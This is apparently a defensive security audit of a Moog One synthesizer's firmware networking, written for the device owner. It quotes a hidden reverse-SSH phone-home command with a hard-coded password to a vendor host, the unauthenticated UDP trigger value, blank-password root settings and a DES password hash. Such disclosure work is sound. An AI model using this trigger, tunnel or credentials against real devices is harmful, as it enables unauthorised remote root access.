# Moog One — Network stack, services, and remote access (firmware v1.8.2)

Definitive region report. Source of record: the decrypted v1.8.2 root filesystem at
`captures/firmware-1.8.2/rootfs-1.8.2/` (referred to below as `R/`), cross-checked
against the owner's own v1.5.0 filesystem (`captures/rootfs-1.5.0/`, `R15/`) and the
live-capture artefacts in `captures/arch-harvest/`.

Nothing here was read from the instrument. Every load-bearing claim is graded
**[READ]** (quoted from a file, with path + line/offset), **[INFERRED]** (reasoning,
with the evidence named), or **[UNKNOWN]**. Read-only commands that would confirm the
load-bearing claims on the real instrument are in the Validation plan.

Binary SHA-256 (v1.8.2), for provenance:

| binary | sha256 |
|---|---|
| `usr/bin/las-dwm` | `0a3561a0…f51d1640` |
| `usr/sbin/dropbear` | `1d28b717…8f303616` |
| `usr/bin/sshpass` | `4ee7c1f3…c06d4819` |
| `usr/bin/las-sc` | `11d24a64…8f2bb15f` |
| `usr/bin/las-frontend` | `7b2ea057…d7d10bfe` |
| `usr/bin/lassvc` | `05d35038…98bc042f` |
| `usr/bin/las-watchdog` | `08d8c27c…768b67a4` |
| `usr/sbin/avahi-daemon` | `c13f63dd…baef172a` |
| `sbin/dhcpcd` | `119d26d5…c9d0c1b7` |

`usr/bin/las-dwm` is **byte-identical** in v1.5.0 and v1.8.2 (same sha256
`0a3561a0…f51d1640`) **[READ, `shasum` of both trees]** — the phone-home described in
§8 is unchanged across the two firmware generations.

---

## 0. Executive summary for the owner

You own this device, so the honest bottom line first:

1. **The instrument runs a reverse-SSH "phone home" to `remote.moogmusic.com`.** It is
   baked into the window manager `las-dwm`, triggered by a magic front-panel code, and
   is byte-for-byte the same in your v1.5.0 and in v1.8.2. It uses a hard-coded
   password and auto-accepts the remote host key. See §8. (Also documented in
   `docs/DANGER.md` and `docs/firmware/small-binaries.md §2`; this report adds the
   network-exposure angle: the trigger arrives on an unauthenticated, source-unvalidated
   UDP listener.)

2. **There is no host firewall.** The only packet-filter rules on the box are four NAT
   **DNAT** rules that *forward* inbound OSC straight to the voice controller, with
   `ip_forward` enabled. Nothing filters INPUT. Every listening service is exposed on
   the studio-LAN interface. See §5, §6.

3. **SSH (dropbear) is gated behind a physical USB "key" dongle**, not on by default —
   but when it does run, it is started with **`-B` (allow blank-password logins)** and
   `root` has an **empty** password. See §7. On a stock unit with no dongle, SSH is not
   started and the root filesystem is remounted read-only at the end of boot.

4. **Two DHCP clients fight over the same external interface** (`ethext`): busybox
   `udhcpc` *and* `dhcpcd`. In the live capture this produced two IP addresses on one
   NIC. See §3.3. Cosmetic-to-annoying, not a security hole, but it is a real bug.

5. The `las` service account uses a **traditional DES `crypt` password hash** — a
   scheme that is trivially brute-forceable by modern standards. It is identical in
   v1.5.0 and v1.8.2. See §7.3.

Severity, plainly: on a **stock** unit (no service dongle) the exposure is limited —
no SSH, `las-dwm` is killed at end of boot so the 9600 backdoor listener is not
persistent, and the live control surface is "only" the unauthenticated OSC/NAT plane.
On a unit that has been left with the **service dongle inserted** (as your captured
instrument was — dropbear and `las-dwm` were both running), the exposure is severe:
blank-password root SSH plus a LAN-triggerable reverse tunnel, both reachable by any
host on the same network.

---

## 1. Interfaces and addressing

### 1.1 Configured interfaces — `R/etc/network/interfaces` **[READ]**

```
auto lo eth0 usbint usbext ethext
iface lo    inet loopback
iface eth0  inet static   address 192.168.1.1  netmask 255.255.255.0  gateway 192.168.1.254
iface usbint inet static  address 203.0.113.1  netmask 255.255.255.0
iface usbext inet dhcp
iface ethext inet dhcp
```

### 1.2 What actually comes up

The two Ethernet interfaces are both **cdc_ether over one USB link** to the XMOS, not
physical PHYs on the i.MX6. From `captures/dmesg-before-reboot.txt:302-305` **[READ]**:

```
cdc_ether 2-1:1.0 usb0: … CDC Ethernet Device, 02:00:00:00:00:00
cdc_ether 2-1:1.2 eth0: … CDC Ethernet Device, a4:11:63:b0:28:9b
cdc_ether 2-1:1.0 usbint: renamed from usb0
cdc_ether 2-1:1.2 ethext: renamed from eth0
```

udev does the renaming by MAC — `R/etc/udev/rules.d/` **[READ]**:

| rule file | match | action |
|---|---|---|
| `20-xmos-nic.rules` | `ATTR{address}=="02:00:00:00:00:00"` | `usb-int.sh %k` |
| `30-usb-nic.rules` | `ATTR{address}=="8c:ae:4c:*"` | `usb-ext.sh %k` |
| `50-eth-ext-nic.rules` | `ATTR{address}=="a4:11:63:b*"` | `eth-ext.sh %k` |

- **`usbint`** = the `02:00:00:00:00:00` cdc_ether, renamed and brought up static
  **203.0.113.1/24** by `usb-int.sh`, which also pins the peer with a static ARP entry:
  `arp -i usbint -s 203.0.113.2 02:00:00:00:00:00` (`R/etc/udev/rules.d/usb-int.sh:6`)
  **[READ]**. `203.0.113.2` is the **voice controller ("vc")** — `R/etc/hosts:2`
  `203.0.113.2 vc` **[READ]**. This is the internal control link to the XMOS/VC side.
- **`ethext`** = the `a4:11:63:b*` cdc_ether, renamed by `eth-ext.sh` and brought up
  **DHCP**. This is the **rear "Ethernet" jack**, bridged through the XMOS. In the live
  capture it held `192.168.1.136/24` (plus a stray `.138`, see §3.3) —
  `arch-harvest/runtime-state.txt:170-172` **[READ]**. This is the studio-LAN interface.
- **`usbext`** = an *optional* USB-Ethernet adapter (MAC prefix `8c:ae:4c:` = Realtek),
  renamed by `usb-ext.sh`, DHCP. Only exists when such an adapter is plugged into the
  rear USB **[INFERRED, from the MAC-prefix match rule]**.

**The `eth0` static `192.168.1.1` block in `interfaces` is dead configuration.**
**[INFERRED — load-bearing]** The `a4:11:63` NIC is renamed to `ethext` by udev
*before* `ifup` runs, so an interface literally named `eth0` never exists at
`ifup -a` time; the `iface eth0 inet static` stanza therefore never applies. Evidence:
the udev rename rule (`50-eth-ext-nic.rules`), and the live capture showing `ethext`
with a DHCP address and **no** `192.168.1.1` anywhere (`runtime-state.txt:165-172`).
Consequence: do not expect the instrument at `192.168.1.1`; it is a DHCP client whose
address the studio's DHCP server assigns. The gateway line (`192.168.1.254`) is
likewise inert.

### 1.3 loopback bounce

`launch-sc-1:7` does `ifdown lo && ifup lo` before starting `sclang` **[READ]** — a
workaround so the SuperCollider UDP sockets bind cleanly on `127.0.0.1`. Harmless.

### 1.4 name resolution

`R/etc/resolv.conf` is a symlink to `../tmp/resolv.conf` **[READ]** — i.e. resolver
config is written at runtime by the DHCP client into tmpfs. `R/etc/nsswitch.conf`
selects `files dns` plus mDNS via `nss-mdns` **[READ, not quoted]**. `/etc/hosts`
has only `localhost` and `vc` (203.0.113.2) **[READ]**.

---

## 2. Port and socket map

Two categories: **listeners on the i.MX6/Linux** (things you can reach *on* the
synth), and **remote endpoints on the voice controller** (203.0.113.2, reached
outbound and via the DNAT in §6).

### 2.1 Authoritative default map — from `las-frontend`'s own `--help` **[READ]**

`las-frontend` prints its port defaults; I recovered them from the usage routine and
the defaults constructor by disassembly (llvm-objdump, `--triple=armv7…`). The `MOVW`
immediates that back each `--port-*` default (function at `0x8bfef8`, printed at
`0x8bffc0`–`0x8c00ac`; defaults also written by the constructor at `0x8cbf28`–`0x8cbf70`):

| `--port-…` option | default | role (from the option's own help text) |
|---|---:|---|
| `--port-response` | **9300** | where the frontend sends OSC tree responses → `las-sc` |
| `--port-panelinput` | **9500** | frontend **listens** for panel data |
| `--port-paneloutput` | **9100** | frontend sends panel messages → VC |
| `--port-oleds` | **9876** | OSC OLED messages → VC |
| `--port-perfinput` | **7772** | frontend receives performance OSC |
| `--port-perfoutput` | **7771** | frontend sends performance OSC → VC |
| `--port-systemclock` | **9501** | system-clock messages → VC |
| `--port-vc` | **7770** | OSC VC messages (the voice bus) |
| `--port-efx` | **7775** | FX-server messages → `sclang`/EFX |

Host defaults are set on the command line in `R/etc/init.d/S43gui:21` **[READ]**:
`--host-paneloutput=203.0.113.2 --host-performance=vc --host-oleds=203.0.113.2
--host-systemclock=vc --host-vc=vc` (and `--host-vc`, `--host-performance`,
`--host-systemclock` all resolve to `vc` = 203.0.113.2).

This map settles the port questions in the task brief: **9876 = OLED**, **9501 =
clock (systemclock)**, **7772 = performance (input)**, **9100/9500 = panel
(out/in)**, **7770 = voice controller**. See §2.4 for the one label that differs from
the brief (7770 "thermal").

### 2.2 Local listeners on the i.MX6

Confirmed against the live `netstat -lnu` / `-lnt` in `runtime-state.txt:127-153`
**[READ]** (per the caveat file, that capture is valid for interface/socket
enumeration). Ownership is attributed from the binaries.

| proto/port | bind addr | owner | evidence | grade |
|---|---|---|---|---|
| **22/tcp** (v4+v6) | `0.0.0.0` / `::` | `dropbear` | `runtime-state.txt:151,153`; only if started (§7.1) | READ (listener) |
| **5353/udp** (v4+v6) | `0.0.0.0` / `::` | `avahi-daemon` | mDNS; `runtime-state.txt:144,147` | READ |
| **68/udp** | `0.0.0.0` | DHCP client(s) | `runtime-state.txt:135`; §3.3 | READ |
| **9300/udp** | `127.0.0.1` | `las-sc` | `-l localhost:9300` (`S42sc:4`); `las-sc` help "Listen address (default localhost:9300"; `/proc/net/udp` `0100007F:2454` per `control-plane.md:185` | READ |
| **9500/udp** | `0.0.0.0` | `las-frontend` | panelinput default 9500 (§2.1); `--panel-state=localhost:9500` names it (`S42sc:4`); `runtime-state.txt:131` | READ |
| **7772/udp** | `0.0.0.0` | `las-frontend` (+`las-sc`) | perfinput default 7772 (§2.1); `las-sc` MOVW `0x1e5c` @ `0x8cbf48`-family; `runtime-state.txt:137` | READ / INFERRED (dual use) |
| **7775/udp** | `0.0.0.0` | `sclang`/EFX | `efx_server.scd:3` `thisProcess.openUDPPort(7775)`; `launch-sc-1:23` `SERVER_RECV_PORT=7775`; `runtime-state.txt:138` | READ |
| **9600/udp** | `0.0.0.0` | **`las-dwm`** | see §8; `bind()` to INADDR_ANY:9600 at `0x18024`, port word `0x8025`→ntohs 9600; `/proc/net/udp` `:2580`=9600; `runtime-state.txt:139` | READ |
| **57110/udp** | `0.0.0.0` | `scsynth` | `scsynth -u 57110` (`runtime-state.txt:115`); `init_sc_1.scd:7` | READ |
| **57120/udp** | `0.0.0.0` | `sclang` | SC language default OSC-in; `runtime-state.txt:132` | READ |
| **9666/udp, 9799/udp** | (bound) | `las-watchdog` | `las-watchdog` strings `kill -9 \`fuser 9799/udp\``, `…9666/udp\`` (it frees then rebinds these); corroborates `control-plane.md:221` | READ (ports) / INFERRED (bind) |
| ephemeral high udp | `0.0.0.0`/`::` | `las-sc`, `las-frontend`, `sclang`, `scsynth` | `runtime-state.txt:133-146` (`49967, 47680, 57735, 46479, 36791, 60603, 45818, 34013/v6`) — outbound/reply sockets | INFERRED |

Note the **8080/tcp** in `runtime-state.txt:152` is **not stock** — it is
`/media/thumbdrive/moogd` (`runtime-state.txt:123`), a USB-launched web server that the
project ran and has since removed (see `CAVEAT-runtime-state.md`). `lassvc`'s "8080"
string hits are CHICKEN-Scheme symbol offsets (`f_51038`, `f_8080:cal…`), **not** an
HTTP port — `lassvc` has no HTTP-server strings **[READ, `strings`]**. There is no
stock web server on this device.

### 2.3 Remote endpoints on the voice controller (203.0.113.2)

Nothing on Linux listens on these; they are the VC's ports, reached outbound by the
frontend/`las-sc`/`las-watchdog` and inbound via the DNAT (§6). Ports and roles from
§2.1 plus `las-watchdog` (`/ping`, `/vx/…` → `vc`) **[READ]**:

- **7770** — voice bus / VC OSC in; `las-watchdog` `/ping` target.
- **7771** — VC performance in.
- **9100** — VC panel in (frontend/`las-dwm`/`lassvc` → `vc:9100`).
- **9876** — VC OLED in.
- **9501** — VC system-clock in.

### 2.4 The one discrepancy with the task brief's port list

The brief's map lists "**7770 thermal**". The binary evidence says **7770 =
voice controller** (`--port-vc` default, §2.1; `las-watchdog` pings `vc:7770`). `las-sc`
does have a thermal path — it polls `/sys/class/thermal/thermal_zone0/temp` under
`--temp` and emits `/therm/sys-temp` (`las-sc` strings `1984536 /therm/sys-temp`,
`1984556 %/sys/class/thermal/…/temp` **[READ]**) — but that OSC rides the existing
VC/frontend channels; there is no separate "thermal port". I record 7770 as the
voice-controller port and flag "thermal" as a mislabel of the same channel. See
Conflicts.

### 2.5 Port 9999

`9999` is the EFX/SC **reply send port** (`launch-sc-1:23`
`SERVER_SEND_PORT=9999` **[READ]**; `sclang` references it; `las-frontend` MOVW 9999 @
`0x2b1258`, `0x9670e8`). It is a *send target*, not a listener I can confirm — it does
not appear in the live `netstat -lnu` **[INFERRED]**. `control-plane.md:589` already
flags 9999's exact target as unconfirmed; I concur.

---

## 3. DHCP

### 3.1 Client on `ethext` #1 — busybox `udhcpc`

`iface ethext inet dhcp` (`interfaces:18`) makes busybox `ifup` spawn `udhcpc`
**[READ + INFERRED from busybox ifupdown behaviour]**. Live: `udhcpc -R -n -p
/var/run/udhcpc.ethext.pid -i ethext` (`runtime-state.txt:108`) **[READ]**. `udhcpc`
is a busybox applet (`R/sbin/udhcpc -> ../bin/busybox`) **[READ]**.

### 3.2 Client on `ethext` #2 — `dhcpcd`

`R/etc/init.d/S95dhcpd:9` **[READ]**: `/sbin/dhcpcd start ethext &`. `dhcpcd` is a
standalone binary (`R/sbin/dhcpcd`, 200 KB) with `R/etc/dhcpcd.conf` **[READ]**. Live:
`/sbin/dhcpcd start ethext` (`runtime-state.txt:121`) **[READ]**.

### 3.3 Why two — and the visible symptom

Both clients target `ethext`. In the live capture both were running (`udhcpc` pid 929,
`dhcpcd` pid 1729) **[READ]** and `ethext` carried **two** addresses:

```
3: ethext … inet 192.168.1.136/24 … scope global ethext
             inet 192.168.1.138/24 … scope global secondary ethext
```
(`runtime-state.txt:170-172`) **[READ]**.

**[INFERRED — load-bearing]** The two independent DHCP clients each obtained a lease
and each installed an address, giving the interface a primary + secondary IP. This is
a configuration bug (redundant clients), not an attack. Consequences: two DHCP leases
consumed per boot; two addresses answer; `dhcpcd`'s `persistent`/`slaac private`
options (`dhcpcd.conf:19,38`) and `udhcpc`'s behaviour can disagree on lifetime and
resolver contents. The right fix is to run exactly one (drop `S95dhcpd`'s `dhcpcd`
call, or set `iface ethext inet manual` and let `dhcpcd` own it).

### 3.4 DHCP/relay *servers* are present but not started

- `R/usr/sbin/dhcpd` (ISC, 535 KB) exists with sample configs
  (`R/etc/dhcp/{dhcp.conf,dhcpd.conf,dhclient.conf}`) **[READ]**. `S80dhcp-server`
  hard-guards on `INTERFACES=""` → `test -n "$INTERFACES" || exit 0`
  (`S80dhcp-server:8,` sanity block) so **dhcpd never starts** **[READ]**. `dhcp.conf`
  contains a `192.168.1.0/24` pool (`.10–.100`) but it is unused.
- `dhcrelay` is referenced by `S80dhcp-relay` but that binary is **absent**
  (`R/usr/sbin/dhcrelay` does not exist) and the script guards on `SERVERS=""`
  anyway → never starts **[READ]**.

---

## 4. Zeroconf / avahi

`R/etc/avahi/avahi-daemon.conf` **[READ]**:

- `host-name=moog-one` → advertises as **`moog-one.local`** (confirmed live:
  `avahi-daemon: running [moog-one.local]`, `runtime-state.txt:118`).
- `allow-interfaces=ethext` — mDNS is emitted **only on the studio-LAN interface**, not
  on the internal `usbint`/VC link.
- `use-ipv4=yes`, `use-ipv6=yes`; `enable-dbus=no`; `publish-hinfo=no`,
  `publish-workstation=no`; rate-limited.

Advertised services (`R/etc/avahi/services/`) **[READ]**:

- `ssh.service` → `_ssh._tcp` port **22**
- `sftp-ssh.service` → `_sftp-ssh._tcp` port **22**

So a stock unit announces SSH/SFTP on the LAN over mDNS **even though dropbear may not
be running** (the `.service` files are static). Anyone doing `dns-sd -B _ssh._tcp` /
`avahi-browse` on the studio LAN will see `moog-one`. Started by `S50avahi-daemon`
after `S05avahi-setup.sh` prepares `/tmp/avahi-autoipd` **[READ]**. `avahi-autoipd`
(169.254.x link-local) is available via `avahi-autoipd.action` but is not wired into
the boot path here **[INFERRED — no init script calls it]**.

Note the identity mismatch (cosmetic): kernel hostname is **`las-production`**
(`R/etc/hostname`), while avahi publishes **`moog-one`** (`avahi-daemon.conf`), and the
`las` user's GECOS is "Linux User". **[READ]**

---

## 5. Firewall posture — there isn't one

`iptables`/`ip6tables` binaries exist (`R/usr/sbin/iptables`, `xtables-multi`, etc.)
**[READ]**, but the **only** rules the system installs are NAT-table `PREROUTING`
`DNAT` rules (§6). A full grep of `R/etc` for `iptables` returns **only** those DNAT
lines — in `S95dhcpd`, `eth-ext.sh`, and `usb-ext.sh` — and **nothing** in the `filter`
table (`INPUT`/`FORWARD`/`OUTPUT`) **[READ, `grep -rn iptables R/etc`]**. There are no
`hosts.allow`/`hosts.deny`/`securetty` files (busybox, no TCP wrappers, no PAM)
**[READ, files absent]**.

Consequence **[INFERRED — load-bearing]**: every listener in §2.2 that binds
`0.0.0.0`/`::` (5353, 7772, 7775, 9500, 9600, 57110, 57120, and 22 when up) is
reachable from **any** interface the box has an address on — including the studio LAN
via `ethext`. The only listener not LAN-exposed on its own is `las-sc`'s 9300, which
binds `127.0.0.1` — but the DNAT in §6 makes even 9300 reachable from the LAN.

---

## 6. NAT / forwarding — the live control plane exposure

`R/etc/init.d/S40network:17` sets `echo "1" > /proc/sys/net/ipv4/ip_forward`
unconditionally **[READ]**.

The DNAT rules are installed in **three** places (so they survive both the
udev-driven bring-up and the `S95dhcpd` path) — `S95dhcpd:11-14`, `eth-ext.sh:7-10`,
`usb-ext.sh:7-10` **[READ]**:

```
iptables -t nat -A PREROUTING -i <ethext|usbext> -p udp --dport 7770 -j DNAT --to 203.0.113.2:7770
                                                        --dport 7771 → 203.0.113.2:7771
                                                        --dport 9100 → 203.0.113.2:9100
                                                        --dport 9300 → 203.0.113.2:9300
```

**[INFERRED — load-bearing, corroborates `docs/DANGER.md:80`,
`system-and-failure-modes.md:700`]** With `ip_forward=1` and these rules, any host on
the studio LAN (or on a plugged USB-Ethernet adapter) can send UDP OSC to
`moog-one:7770/7771/9100/9300` and it is routed straight to the voice controller
(203.0.113.2) — no tunnel, no authentication. 7770/7771 are the voice bus and
performance channels; 9100 is the panel channel; 9300 lands on `las-sc`'s otherwise
loopback-only OSC input. This is the unauthenticated remote-control surface for the
sound engine and `las-sc`. It is a *feature* of the architecture (the frontend and
external controllers drive the engine this way), but exposed on the LAN with no filter.

`las-sc` additionally accepts an OSC-settable OSC destination: `/seq/dest/ip`,
`/seq/dest/port`, `/seq/dest/mac` (`las-sc` strings `1992130 /seq/dest/port`, and the
`ip`/`mac` twins) **[READ]**. That means a party who can already reach `las-sc`'s
input (via the 9300 DNAT) can redirect where `las-sc` sends sequencer/OSC traffic
**[INFERRED — from the address names; exact effect not traced]**. Worth a closer look
in a follow-up; noted in Unexplored.

---

## 7. SSH / dropbear and local authentication

### 7.1 dropbear is gated behind a physical "key" dongle

`R/etc/init.d/S50dropbear` **[READ]** does **not** unconditionally start sshd. Its
`start()` only launches dropbear if a magic file is present:

```
if [ -e /media/thumbdrive/k ]; then
    keyval=`hexdump /media/thumbdrive/k | awk '{print $3 $2}'`
    if [ $keyval = 23051934 ]; then
        …
        start-stop-daemon -S -q -p /var/run/dropbear.pid --exec /usr/sbin/dropbear -- $DROPBEAR_ARGS
        exit;
    fi;
fi;
```
(`S50dropbear:29-42`).

`23051934` reads as **23/05/1934 — Bob Moog's birthday** **[INFERRED]**. The same
key-file + magic-value gate guards `S99final` (§7.5). So a USB stick containing the
right bytes at `/media/thumbdrive/k` is the service/developer unlock dongle. On a stock
unit with no such stick, **dropbear is never started at boot** **[READ]**.

The live capture shows two `dropbear -B -R` processes running
(`runtime-state.txt:119,124`) **[READ]** — i.e. the captured instrument had the dongle
present.

### 7.2 dropbear arguments — `-B` allows blank passwords

`R/etc/default/dropbear` **[READ]**: `DROPBEAR_ARGS="-B "`. The init script appends
`-R` (`S50dropbear:10`). So it runs as **`dropbear -B -R`**.

From dropbear's own server usage text embedded in the binary (`R/usr/sbin/dropbear`
strings, offset `0x3d172`) **[READ]**, in option order: `-w` "Disallow root logins",
`-s` "Disable password logins", `-g` "Disable password logins for root", **`-B`
"Allow blank password logins"**, `-j`/`-k` port-forwarding, `-a` "Allow connections to
forwarded ports from any host". `-R` = "Create hostkeys as required".

**[INFERRED — load-bearing]** `-B` sets dropbear's *allow-blank-password* mode, and
neither `-w` (no-root) nor `-s` (no-password) is present, so **password auth is on,
root login is allowed, and blank passwords are accepted**. Combined with §7.3 this
means empty-password root SSH.

### 7.3 Local accounts and password hashes — `R/etc/passwd`, `R/etc/shadow` **[READ]**

```
root:x:0:0:root:/root:/bin/sh
las:x:1003:1003:Linux User,,,:/root:/bin/sh
```
```
root::10933:0:99999:7:::                 ← empty password field
las:bqMQnZNvDg8lE:20854:0:99999:7:::     ← DES crypt hash
avahi:*:… dbus:*:…  (all others locked with * )
```

- **root has an empty password.** With `dropbear -B` (§7.2), an SSH login as `root`
  with an empty password would be accepted **[INFERRED — load-bearing; precondition:
  dropbear running, i.e. dongle present]**. On the console (`getty` on
  `console`, `inittab:27`) an empty-password root login is also possible **[INFERRED]**.
- **`las`** (uid 1003, home `/root`, shell `/bin/sh`) has hash `bqMQnZNvDg8lE` — a
  **traditional DES `crypt`** hash (13 chars, salt `bq`, no `$id$` prefix), a scheme
  that is weak/brute-forceable by construction **[READ (the hash) + INFERRED (scheme)]**.
  I did **not** crack it (the attempt was blocked by policy and is unnecessary for the
  finding); a proposed offline read-only check is in the Validation plan.

Both hashes are **identical in v1.5.0** (`R15/etc/shadow`: same `root::` and same
`las:bqMQnZNvDg8lE`) and `R15/etc/default/dropbear` is likewise `-B ` **[READ]** — the
weak-auth posture is unchanged across firmware generations.

### 7.4 authorized_keys — a Moog master key, path caveat

`R/etc/ssh/authorized_keys` holds one 4096-bit RSA key commented
`root@moog-one.local` **[READ]**. dropbear reads **`$HOME/.ssh/authorized_keys`**
(binary strings `%s/.ssh/authorized_keys`), **not** `/etc/ssh/authorized_keys`
**[READ]**. root's `$HOME` is `/root` → `/var/local/root` (symlink, `R/root ->
/var/local/root`) **[READ]**. Whether `/var/local/root/.ssh/authorized_keys` exists or
links to `/etc/ssh/authorized_keys` cannot be determined from this image (the
`/var/local` overlay is populated at runtime and is not in the rootfs) **[UNKNOWN]**.
If it is wired up, that RSA key is a **vendor master key** granting root over SSH to
any unit running dropbear. Flagged for validation.

### 7.5 The read-only-root / "special" gate — `S99final` **[READ]**

`S99final:31-44` mirrors the dropbear gate. With the valid key file it keeps the
watchdog and **leaves the filesystem writable**; **without** the key it does
`killall xterm; killall las-dwm; mount -f -o remount,ro /` (`S99final:42-44`).

**[INFERRED — load-bearing]** On a stock (no-dongle) unit, `las-dwm` is **killed at the
end of boot**, so the 9600 OSC listener / phone-home surface (§8) is **not persistent**;
and `/` is remounted **read-only**. On a dongle unit, `las-dwm` and dropbear persist and
`/` stays read-write. This is the single most important nuance for judging exposure.

### 7.6 dropbear can also be started from service mode

`lassvc` contains the string `start-stop-daemon -S -q -p /var/run/dropbear.pid --exec
/usr/sbin/dropbear -- -R` (and a matching stop, and `pidof dropbear`) **[READ]**.
`lassvc` is reached from **service mode**, which `detect-held-buttons` enters when
**HOME+SETTINGS** are held at power-on (button code 48) — `R/usr/bin/detect-held-buttons:11-20`
**[READ]**. So there is a **physical-presence** path to bring SSH up (with `-R` only,
no `-B`) that does not need the dongle. `lassvc` itself is an OSC client to the VC/panel
(`-t vc:7770 -p vc:9100`), not a network daemon **[READ; corroborates
`docs/firmware/lassvc.md`]**.

---

## 8. The phone-home reverse-SSH tunnel (network view)

This backdoor lives in `las-dwm` and is documented in `docs/DANGER.md:194` and
`docs/firmware/small-binaries.md §2`. My independent disassembly **confirms it exactly**
and adds the network-exposure detail. Grades below are from my own reading.

### 8.1 The listener — `las-dwm` on UDP 9600, INADDR_ANY **[READ]**

`las-dwm`'s socket-setup routine (`0x17fa0`) creates a UDP socket, then:
- builds a `sockaddr_in` for `203.0.113.2` (`inet_addr`, string `0x1c482`) port word
  `0x8c23` → `ntohs` = **9100** (its *send* target — the VC panel port), and
- `memset`s a second `sockaddr_in` to zero, sets family `AF_INET`, sets port word
  `0x8025` → `ntohs` = **9600**, leaves the address `0.0.0.0` (INADDR_ANY), and
  `bind()`s it (`0x18024`). On failure it prints "bind failed" (`0x1c48e`).

The receive loop (`0x141f0`–`0x1442c`) `sendto()`s `/cb i <flag>` to the VC on
`:9100` (`0x1423c`; address string `/cb` `0x1c09c`, type tag `i` `0x1c0a0`), then
`select()`/`recvfrom()`s on the 9600 socket (`0x1429c`) and dispatches on the returned
OSC integer. **The source address is captured into the stack but never checked before
dispatch** **[INFERRED — from the disassembly: `recvfrom`'s src buffer at `sp+40` is
not compared before the `system()`/`popen()` calls]**.

Live confirmation: `0.0.0.0:9600` is listening (`runtime-state.txt:139`), and
`/proc/net/udp` shows it as `:2580` (=9600) **[READ]**.

### 8.2 The dispatch table **[READ]**

Integer arg → action (`0x14304` switch):

| `/cb` value | action |
|---:|---|
| 49 / 50 / 51 / 52 | `system("… xdotool key alt+1/2/3/4")` — workspace switch |
| 56 | `xdotool key` (workspace) |
| **`0x02000030` (33554480)** | **phone-home sequence** (§8.3) |

### 8.3 The phone-home sequence **[READ]** (`0x1434c`–`0x143bc`)

Executed when `/cb == 0x02000030`, in order:

1. `system("… rm -rf /var/log/phonehome.log")` (`0x1c176`)
2. `system("… echo \`date\` > /var/log/phonehome.log")` (`0x1c1a2`)
3. `popen("… (sshpass -plas ssh -N -T -y -R22222:localhost:22 -p4448
   las@remote.moogmusic.com &) >> /var/log/phonehome.log 2>&1")` (`0x1c1d9`)
4. a monitor loop that `popen`s the sshpass-PID watch (`0x1c25a`), then
5. `system("… killall las-frontend ; fbv /usr/share/splash/phonehome.png")` (`0x1c379`)
   — kills the UI and shows a full-screen "phone home" splash.

`sshpass` (`R/usr/bin/sshpass`), `ssh`/`dbclient` (dropbear), `xdotool`, `fbv`, and
`usr/share/splash/phonehome.png` are all present in the image **[READ]**.

### 8.4 What it does, in plain terms, and the network risk

`ssh -R22222:localhost:22 … -p4448 las@remote.moogmusic.com` opens a **reverse tunnel**:
it dials out to `remote.moogmusic.com` on TCP **4448**, authenticating as user `las`
with the hard-coded password **`las`** (`-plas`) and **auto-accepting the remote host
key** (`-y`), and asks that server to forward its port **22222** back to the
instrument's local **:22** (dropbear). Anyone with access to that remote server can
then `ssh -p 22222 las@localhost` to reach this instrument's SSH — from anywhere,
NAT/firewall notwithstanding, because the instrument made the outbound connection.

Network-exposure assessment **[INFERRED — load-bearing]**:

- **Trigger reachability.** The dispatch is driven by an OSC integer arriving on
  UDP **9600**, which binds INADDR_ANY and does **no source validation** (§8.1). On a
  unit where `las-dwm` is running (a dongle unit, §7.5), **any host on the studio LAN
  can send `/cb i 33554480` to `moog-one:9600` and arm the tunnel** — it does not
  require the physical button combo. On a stock unit `las-dwm` is killed at end of boot,
  so 9600 is not persistently open and this path is dormant.
- **Second-order risk.** Once the tunnel is up, reaching the instrument's shell needs
  the local `las`/`root` credentials (§7.3) — empty root password makes that trivial.
- **Availability of the far end.** As `DANGER.md:205` notes, `remote.moogmusic.com`
  may no longer be under Moog's control; a lapsed/hijacked DNS name that the device
  will `ssh -y` (blindly trust) into is its own hazard.

Mitigation for the owner, in order of effort: keep the service dongle **out** of the
unit in normal use (kills persistence of both dropbear and 9600); block egress to
`remote.moogmusic.com:4448` at the studio router; and, if comfortable editing the
read-write image, neutralise the `las-dwm` phone-home strings. (No instrument writes
in this report — these are recommendations for the owner to weigh.)

---

## 9. Other network-relevant services and binaries

- **dbus** (system bus) — started by `S30dbus` (`dbus-daemon --system`) **[READ]**;
  local IPC, not networked. avahi runs with `enable-dbus=no` so it does not use it.
- **X server** — `S12splash:19` `X :0 -nocursor -s 0` **[READ]**. No `-nolisten tcp`
  flag, but the live `netstat -lnt` shows **no** TCP 6000 (`runtime-state.txt:148-153`)
  **[READ]** → X is not listening on TCP (unix/abstract socket only) **[INFERRED]**.
- **wpa_supplicant** — binary + `R/etc/wpa_supplicant.conf` present, but the config is
  a **placeholder template** (`ssid="<put desired ssid here>"`,
  `psk=<put result of wpa_passphrase here>`) **[READ]** and no init script starts it;
  no Wi-Fi hardware is enumerated in `dmesg` **[INFERRED]**. Dormant.
- **dnsd**, **inetd**, **telnetd** — `dnsd`/`inetd` binaries exist; busybox provides
  `telnetd`/`inetd`/`tftp`/`httpd` applets — but **none is referenced by any init
  script or `inittab`** **[READ, `grep`]**. Not started.
- **crond** — `R/usr/sbin/crond` exists; `R/etc/crontab/root` has one job
  `0 3 * * * /etc/log-refresh` **[READ]**. `log-refresh` is a local log-rotation
  helper (`R/etc/log-refresh`), not network. (Whether crond is actually launched is not
  in an init script I found — likely started elsewhere or unused; minor.)
- **syslogd/klogd** — `S01logging` starts busybox `syslogd -n`/`klogd -n` **[READ]**;
  local logging, no remote-log target configured.

---

## 10. Security posture — honest assessment

Ordered by severity. All are on the studio-LAN (`ethext`) attack surface unless noted.

1. **Reverse-SSH phone-home (§8).** Hard-coded, auto-trusting, LAN-armable on dongle
   units, dormant on stock units. Identical in v1.5.0 and v1.8.2. **High** on a unit
   left with the dongle in; **low/latent** on a stock unit.
2. **Blank-password root SSH when dropbear runs (§7.1-7.3).** `-B` + empty root hash.
   Gated by the service dongle (or the service-mode button path, which starts dropbear
   without `-B` but root still has no password). **High** when SSH is up.
3. **No host firewall + NAT DNAT to the VC + `ip_forward` (§5, §6).** Unauthenticated
   OSC control of the sound engine and `las-sc` from any LAN host, on 7770/7771/9100/9300,
   plus every INADDR_ANY listener directly exposed. **Medium-High** (by design, but
   unfiltered). Present on every unit, stock or not.
4. **Weak `las` password hash (DES crypt) (§7.3).** **Medium.**
5. **Possible vendor master SSH key (§7.4).** **Medium**, contingent on the `/var/local`
   overlay wiring, which this image cannot show.
6. **mDNS advertises SSH/SFTP on the LAN even when dropbear is off (§4).** Information
   disclosure / attack-surface advertisement. **Low.**
7. **Two DHCP clients on one interface (§3.3).** Reliability bug, not security. **Low.**

